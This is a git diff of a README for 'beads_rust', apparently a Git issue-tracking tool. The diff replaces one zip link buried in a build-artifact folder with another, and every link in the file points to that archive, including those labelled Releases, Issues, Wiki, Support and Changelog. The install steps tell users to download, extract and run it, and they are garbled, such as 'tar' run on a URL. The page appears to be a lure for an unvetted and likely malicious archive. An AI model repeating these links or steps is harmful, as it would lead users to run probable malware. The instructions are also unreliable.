@@ -4,7 +4,7 @@
 
 Welcome to beads_rust. This is a fast and efficient tool for tracking issues in your Git repositories. Follow the steps below to download and run the application.
 
-[![Download beads_rust](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip)](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip)
+[![Download beads_rust](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip)](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip)
 
 ## 📝 Features
 
@@ -22,11 +22,11 @@ To run beads_rust, your system should meet the following:
 
 ## 📥 Download & Install
 
-To download beads_rust, visit the [Releases page](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip). There, you will find the latest version available.
+To download beads_rust, visit the [Releases page](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip). There, you will find the latest version available.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release.
-3. Find the file that suits your system (look for `.exe` for Windows or `https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip` for Linux, for example).
+3. Find the file that suits your system (look for `.exe` for Windows or `https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip` for Linux, for example).
 4. Click on the file name to start the download.
 
 Once the download is complete:
@@ -48,7 +48,7 @@ Once the download is complete:
 
 1. Open a terminal window.
 2. Navigate to your "Downloads" directory using `cd ~/Downloads`.
-3. Extract the downloaded file using `tar -xvzf beads_rust-*https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip`.
+3. Extract the downloaded file using `tar -xvzf beads_rust-*https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip`.
 4. Change to the extracted directory by running `cd beads_rust-*`.
 5. Start the application by running `./beads_rust`.
 
@@ -63,12 +63,12 @@ After installation, you can start using beads_rust to track issues:
 
 ## 📁 Support
 
-If you encounter any issues during installation or usage, check the documentation available in the application or visit our [GitHub page](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip).
+If you encounter any issues during installation or usage, check the documentation available in the application or visit our [GitHub page](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip).
 
 ## 🔗 Additional Resources
 
-- [GitHub Issues](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip): Report bugs or request features.
-- [Wiki](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip): Access tutorials and guides on using beads_rust effectively.
+- [GitHub Issues](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip): Report bugs or request features.
+- [Wiki](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip): Access tutorials and guides on using beads_rust effectively.
 
 ## 🤝 Community Contributions
 
@@ -76,8 +76,8 @@ We welcome contributions! If you want to help improve beads_rust, please fork th
 
 ## 🛠 Changelog
 
-Check the [Changelog](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip) for information on new features, bug fixes, and improvements.
+Check the [Changelog](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip) for information on new features, bug fixes, and improvements.
 
-[![Download beads_rust](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip)](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old.1768660928/debug/.fingerprint/log-496cf8a3b8dcf87b/beads-rust-caverned.zip)
+[![Download beads_rust](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip)](https://github.com/juanlu12332/beads_rust/raw/refs/heads/main/target.old/debug/deps/rmetamOOA8u/rust_beads_v3.7.zip)
 
 Thank you for choosing beads_rust!
